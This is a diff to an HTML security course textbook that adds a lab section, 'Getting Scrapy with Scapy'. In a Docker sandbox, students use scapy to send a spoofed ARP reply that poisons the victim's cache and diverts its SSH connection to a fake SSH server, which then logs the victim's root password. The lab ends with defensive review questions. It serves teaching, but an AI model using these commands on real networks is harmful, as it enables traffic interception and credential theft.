@@ -149,6 +149,7 @@ table {
 <ul class="sectlevel2">
 <li><a href="#_interception_attacks">5.1. Interception Attacks</a></li>
 <li><a href="#_layer_2_attacks">5.2. Layer 2 Attacks</a></li>
+<li><a href="#_review_5">5.3. Review</a></li>
 </ul>
 </li>
 </ul>
@@ -2703,6 +2704,8 @@ This then allows an attacker to capture traffic from other machines on the netwo
 </div>
 <div class="sect3">
 <h4 id="_arp_poisoning">5.2.3. ARP Poisoning</h4>
+<div class="openblock float-group">
+<div class="content">
 <div class="imageblock left">
 <div class="content">
 <img src="images/arp.svg" alt="arp" width="500">
@@ -2712,6 +2715,505 @@ This then allows an attacker to capture traffic from other machines on the netwo
 <p>An attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router.
 By repeatedly sending out ARP packets, <em>gratuitous arp</em>, redirecting packets bound for the gateway&#8217;s IP to the attackers MAC address an attacker can set up a MitM scenario.
 This is particularly difficult because depending on the TTL of the ARP cache it may take up to 20 minutes for normal network operations to resume.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_review_5">5.3. Review</h3>
+<div class="sect3">
+<h4 id="_labs_5">5.3.1. Labs</h4>
+<div class="openblock labs">
+<div class="title">Getting Scrapy with Scapy</div>
+<div class="content">
+<div class="paragraph">
+<p>In this lab we will use a fake SSH server, <a href="https://github.com/jaksi/sshesame">sshesame</a>, and an interactive packet manipulation program, <a href="https://scapy.net/">scapy</a>, to disrupt an ongoing SSH session between victim and server, position ourself in the middle of the traffic, and capture the username and password victim is using.</p>
+</div>
+<div class="paragraph">
+<p>For this lab our IP addresses are configured statically and are known to the attacker.
+It is also assumed that the attacker is on the local network.
+Lastly victim has been poorly configured to ignore changes to the host key.
+This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file when prompted anyway.</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<caption class="title">Table 1. IP Addresses Used</caption>
+<colgroup>
+<col style="width: 50%;">
+<col style="width: 50%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top">Name</th>
+<th class="tableblock halign-left valign-top">IP Address</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">server</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">172.20.0.5</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">victim</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">172.20.0.6</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">attacker</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">172.20.0.7</p></td>
+</tr>
+</tbody>
+</table>
+<div class="paragraph">
+<p>Start by downloading the scapy.zip file which contains the Docker Compose configuration we will be using.
+Uncompress it to a directory where you have write access.
+This lab will require us to use three terminal windows/tabs: one for the <code>docker-compose up</code> command which will show the output of everything running in the background, one for the victim which will show an SSH session with the server, and one for the attacker which we will use to make the attack.</p>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="images/scapy.svg" alt="scapy" width="800" height="352">
+</div>
+</div>
+<div class="paragraph">
+<p>Open three terminals and <code>cd</code> into the directory where you uncompressed the lab zip file in each of them.
+There should be a <code>docker-compose.yml</code> file and <code>server</code>, <code>victim</code>, and <code>attacker</code> directories in the directory you are in.</p>
+</div>
+<div class="paragraph">
+<p>In the first terminal run the <code>docker-compose up</code> command to build the images and run the containers:</p>
+</div>
+<div class="listingblock">
+<div class="title">docker-compose up</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose up
+Creating network "scapy_testnet" with the default driver
+Creating scapy_server_1   ... done
+Creating scapy_victim_1   ... done
+Creating scapy_attacker_1 ... done
+Attaching to scapy_victim_1, scapy_server_1, scapy_attacker_1
+server_1    | &gt; Starting SSHD
+server_1    | &gt;&gt; Generating new host keys
+scapy_victim_1 exited with code 0
+attacker_1  | INFO 2021/10/07 13:56:45 No host keys configured, using keys at "/root/.local/share/sshesame"
+attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_rsa_key" not found, generating it
+attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ecdsa_key" not found, generating it
+attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ed25519_key" not found, generating it
+attacker_1  | INFO 2021/10/07 13:56:45 Listening on [::]:22 <i class="conum" data-value="1"></i><b>(1)</b>
+server_1    | ssh-keygen: generating new host keys: RSA DSA ECDSA ED25519
+server_1    | &gt;&gt;&gt; Fingerprints for dsa host key
+server_1    | 1024 MD5:a5:e6:e9:38:d2:2e:88:fd:f0:aa:a8:05:07:35:5f:18 root@a010fe3c2f3c (DSA)
+server_1    | 1024 SHA256:NM7DONpt1doZp4e6WV+6WVVr+KUrh9luUSRcAhnzdyw root@a010fe3c2f3c (DSA)
+server_1    | 1024 SHA512:LHfFdSk1XiAKQArH0CW+RkaKv5GgovPCH7UIQ+P4T2LbgGpCBP5aGA1V3oriYbTZWuS9TlUgDbEfTBq19AV/cA root@a010fe3c2f3c (DSA)
+server_1    | &gt;&gt;&gt; Fingerprints for rsa host key
+server_1    | 3072 MD5:74:44:b6:a2:74:b9:7e:1b:ba:3d:27:b8:19:3a:48:df root@a010fe3c2f3c (RSA)
+server_1    | 3072 SHA256:mubm9mLNrdNDk5fyj0dghDBIbbwcVKXo23Qdv61/S/c root@a010fe3c2f3c (RSA)
+server_1    | 3072 SHA512:JFQhS6trY7sNqRSwZ+t0uyBb5ddNh9qSLtBrMaa5G7xWzKHpxCuKBSDbvLk4W9JKeQftTU4293UDV9vqCcf/6w root@a010fe3c2f3c (RSA)
+server_1    | &gt;&gt;&gt; Fingerprints for ecdsa host key
+server_1    | 256 MD5:15:75:5f:9b:72:7c:f0:13:ea:0d:b4:47:b7:62:69:63 root@a010fe3c2f3c (ECDSA)
+server_1    | 256 SHA256:4p/Afp/8C2tHn7AePdS7OHCgPxfBamdaLIUg4IJ7xx4 root@a010fe3c2f3c (ECDSA)
+server_1    | 256 SHA512:NnbevqBXFkGQWIirdFsLPnX85q7q/1Y7E4i+BLHLqE3cg2aqkduBJsssyr9+G7bSvq7txvjl9SRmyRAzuDT7DQ root@a010fe3c2f3c (ECDSA)
+server_1    | &gt;&gt;&gt; Fingerprints for ed25519 host key
+server_1    | 256 MD5:ad:00:61:26:4d:a0:07:be:6b:8e:91:bd:f0:65:e6:14 root@a010fe3c2f3c (ED25519)
+server_1    | 256 SHA256:Vl7jQulDsONglP1xbSN+J8nSfCaIER40rHhgy7z/BYg root@a010fe3c2f3c (ED25519)
+server_1    | 256 SHA512:WkmvOWe6oaZ/qE1ZiA0rZAjn9H+hCDxI8NHpsjRNCalK/CgVV9+VhkzHgRTKfKTqQeE0y/Zz2GaEJGv/sapCHg root@a010fe3c2f3c (ED25519)
+server_1    | WARNING: No SSH authorized_keys found!
+server_1    | &gt;&gt; Unlocking root account
+server_1    | WARNING: password authentication enabled.
+server_1    | WARNING: password authentication for root user enabled.
+server_1    | &gt;&gt; Running: /etc/entrypoint.d/changepw.sh
+server_1    | Running /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
+server_1    | Server listening on 0.0.0.0 port 22. <i class="conum" data-value="2"></i><b>(2)</b>
+server_1    | Server listening on :: port 22.</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>Notice that attacker has a fake SSH server running in the background</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="2"></i><b>2</b></td>
+<td>Notice that server has a legitimate SSH server running in the background</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>In the second terminal run <code>docker-compose run victim bash</code> and then from the prompt we&#8217;ll SSH to server using the password "password":</p>
+</div>
+<div class="listingblock">
+<div class="title">victim</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose run victim bash
+Creating scapy_victim_run ... done
+bash-5.0# ssh server
+Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
+root@server's password: <i class="conum" data-value="1"></i><b>(1)</b>
+You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
+Leave this connection open while you experiment with scapy from 'attacker'.
+bf9ebe42a108:~#</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>The password is "password"</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>In the third terminal we&#8217;ll start by <em>executing</em> (recall that at this point it&#8217;s already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server&#8217;s IP address.
+Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5.</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-console" data-lang="console">PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose exec attacker bash
+root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0
+root@5195de3d330c:/# ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
+    link/ipip 0.0.0.0 brd 0.0.0.0
+3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
+    link/sit 0.0.0.0 brd 0.0.0.0
+347: eth0@if348: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 <i class="conum" data-value="1"></i><b>(1)</b>
+       valid_lft forever preferred_lft forever
+    inet 172.20.0.5/32 scope global eth0 <i class="conum" data-value="2"></i><b>(2)</b>
+       valid_lft forever preferred_lft forever</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>This is the IP we started with</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="2"></i><b>2</b></td>
+<td>This is an additional IP that attacker believes it has</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Now that the attacker system is configured, we&#8217;ll start up <code>scapy</code> interactively:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">root@5195de3d330c:/# scapy
+INFO: Can't import matplotlib. Won't be able to plot.
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
+INFO: No IPv6 support in kernel
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
+WARNING: IPython not available. Using standard Python shell instead.
+AutoCompletion, History are disabled.
+
+                     aSPY//YASa
+             apyyyyCY//////////YCa       |
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.5
+ AYAsAYYYYYYYY///Ps              cY//S   |
+         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
+         SPPPP///a          pP///AC//Y   |
+              A//A            cyP////C   | Have fun!
+              p///Ac            sC///a   |
+              P////YCpc           A//A   | To craft a packet, you have to be a
+       scccccp///pSP///p          p//Y   | packet, and learn how to swim in
+      sY/////////y  caa           S//P   | the wires and in the waves.
+       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme
+        sY/PsY////YCc          aC//Yp    |
+         sc  sccaCY//PCypaapyCP//YSs
+                  spCPY//////YPSps
+                       ccaacs
+&gt;&gt;&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>You&#8217;ll notice that scapy&#8217;s prompt is &gt;&gt;&gt;, just like python because it <em>is</em> python.
+Since we&#8217;re working in python, let&#8217;s make our lives easier by defining a few simple variables:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; server_ip = "172.20.0.5" <i class="conum" data-value="1"></i><b>(1)</b>
+&gt;&gt;&gt; victim_ip = "172.20.0.6"</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>IPv4 addresses are strings in scapy</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Now let&#8217;s see how scapy allows us to build packets.
+We&#8217;ll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" <i class="conum" data-value="1"></i><b>(1)</b>
+&gt;&gt;&gt; ping.show() <i class="conum" data-value="2"></i><b>(2)</b>
+###[ Ethernet ]###
+  dst       = 02:42:ac:14:00:05
+  src       = 02:42:ac:14:00:07
+  type      = IPv4
+###[ IP ]###
+     version   = 4
+     ihl       = None
+     tos       = 0x0
+     len       = None
+     id        = 1
+     flags     =
+     frag      = 0
+     ttl       = 64
+     proto     = icmp
+     chksum    = None
+     src       = 172.20.0.7
+     dst       = 172.20.0.5
+     \options   \
+###[ ICMP ]###
+        type      = echo-request
+        code      = 0
+        chksum    = None
+        id        = 0x0
+        seq       = 0x0
+        unused    = ''
+###[ Raw ]###
+           load      = 'Ryan Tolboom'
+
+&gt;&gt;&gt; result = srp1(ping) <i class="conum" data-value="3"></i><b>(3)</b>
+Begin emission:
+Finished sending 1 packets.
+.*
+Received 2 packets, got 1 answers, remaining 0 packets
+&gt;&gt;&gt; result.show()
+###[ Ethernet ]###
+  dst       = 02:42:ac:14:00:07
+  src       = 02:42:ac:14:00:05
+  type      = IPv4
+###[ IP ]###
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 40
+     id        = 62086
+     flags     =
+     frag      = 0
+     ttl       = 64
+     proto     = icmp
+     chksum    = 0x301a
+     src       = 172.20.0.5
+     dst       = 172.20.0.7
+     \options   \
+###[ ICMP ]###
+        type      = echo-reply
+        code      = 0
+        chksum    = 0xea7a
+        id        = 0x0
+        seq       = 0x0
+        unused    = ''
+###[ Raw ]###
+           load      = 'Ryan Tolboom'
+
+&gt;&gt;&gt; server_mac = result[0][0].src
+&gt;&gt;&gt; server_mac
+'02:42:ac:14:00:05'</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>Scapy uses the '/' operator to nest protocols.
+This is my name in an ICMP packet, in an IP packet, in an Ethernet frame.
+Be sure you use your own name!</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="2"></i><b>2</b></td>
+<td>The <code>show()</code> command prints out packets in detail</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="3"></i><b>3</b></td>
+<td>The <code>srp1()</code> function sends and receives <em>one</em> packet at Layer 2</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Notice how we use this to capture the server&#8217;s MAC address and save it in the <code>server_mac</code> variable.</p>
+</div>
+<div class="admonitionblock important deliverable">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>We can also determine MAC addresses at Layer 2 with an ARP "who-has" request.
+Let&#8217;s craft and send a broadcast ethernet frame with an ARP "who-has" request for the victims&#8217;s IP address.
+The result will tell use what the victim&#8217;s MAC address is:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip)
+&gt;&gt;&gt; result = srp1(whohas)
+Begin emission:
+Finished sending 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+&gt;&gt;&gt; result.show()
+###[ Ethernet ]###
+  dst       = 02:42:ac:14:00:07
+  src       = 02:42:ac:14:00:06 <i class="conum" data-value="1"></i><b>(1)</b>
+  type      = ARP
+###[ ARP ]###
+     hwtype    = 0x1
+     ptype     = IPv4
+     hwlen     = 6
+     plen      = 4
+     op        = is-at
+     hwsrc     = 02:42:ac:14:00:06
+     psrc      = 172.20.0.6
+     hwdst     = 02:42:ac:14:00:07
+     pdst      = 172.20.0.7
+
+&gt;&gt;&gt; victim_mac = result[0].src</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>This is my MAC address of victim, but yours may be different!</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>This is how an ARP exchange is supposed to work.
+We broadcast out asking what MAC we should use for a certain IP and we get a response <em>from the person who legitimately has that MAC and IP</em>.</p>
+</div>
+<div class="paragraph">
+<p>We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; victim_ip, victim_mac, server_ip, server_mac
+('172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05')</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now let&#8217;s make and view an evil ARP packet:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)
+&gt;&gt;&gt; bad_arp
+&lt;ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours (by default, we don&#8217;t specify with <code>hwsrc</code>).
+This means the victim will update their ARP cache such that frames destined for server go to attacker.
+This effectively reroutes all layer 2 traffic that was going to the server from the victim.</p>
+</div>
+<div class="paragraph">
+<p>Go ahead an send that ARP packet:</p>
+</div>
+<div class="listingblock">
+<div class="title">attacker</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; send(bad_arp)
+.
+Sent 1 packets.</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now go back to the victim terminal with the SSH connection to server and try typing something.
+As soon as SSH has to send data, you will get a broken pipe error and the connection will drop.
+Faced with such a problem, what do you think most users will do?
+Probably try to reconnect, let&#8217;s try that too.
+Remember the password is "password".</p>
+</div>
+<div class="listingblock">
+<div class="title">victim</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
+Leave this connection open while you experiment with scapy from 'attacker'.
+bf9ebe42a108:~# client_loop: send disconnect: Broken pipe <i class="conum" data-value="1"></i><b>(1)</b>
+bash-5.0# ssh server
+Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
+root@server's password:
+#</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>This happened when they tried to type something right after we sent the malicious ARP</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Wait, that prompt looks a little different and where&#8217;s the message about staying logged in?
+It turns out the victim actually signed into our fake SSH server and their username and password were logged!
+Take a look at the output from the terminal running <code>docker-compose up</code>, you&#8217;ll see the credentials entered:</p>
+</div>
+<div class="listingblock">
+<div class="title">docker-compose up terminal</div>
+<div class="content">
+<pre class="highlight"><code class="language-text" data-lang="text">attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted</code></pre>
+</div>
+</div>
+<div class="admonitionblock important deliverable">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+<div class="qlist qanda">
+<ol>
+<li>
+<p><em>How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?</em></p>
+<p></p>
+</li>
+<li>
+<p><em>Would using keys instead of passwords help prevent this kind of attack? Why or why not?</em></p>
+<p></p>
+</li>
+<li>
+<p><em>How would managing host keys correctly prevent this kind of attack?</em></p>
+<p>{emtpy}</p>
+</li>
+</ol>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>To stop the running containers, you can type Ctrl-C in the terminal running <code>docker-compose up</code>, exit out of the victim, and exit out of the attacker.</p>
+</div>
+</div>
 </div>
 </div>
 </div>
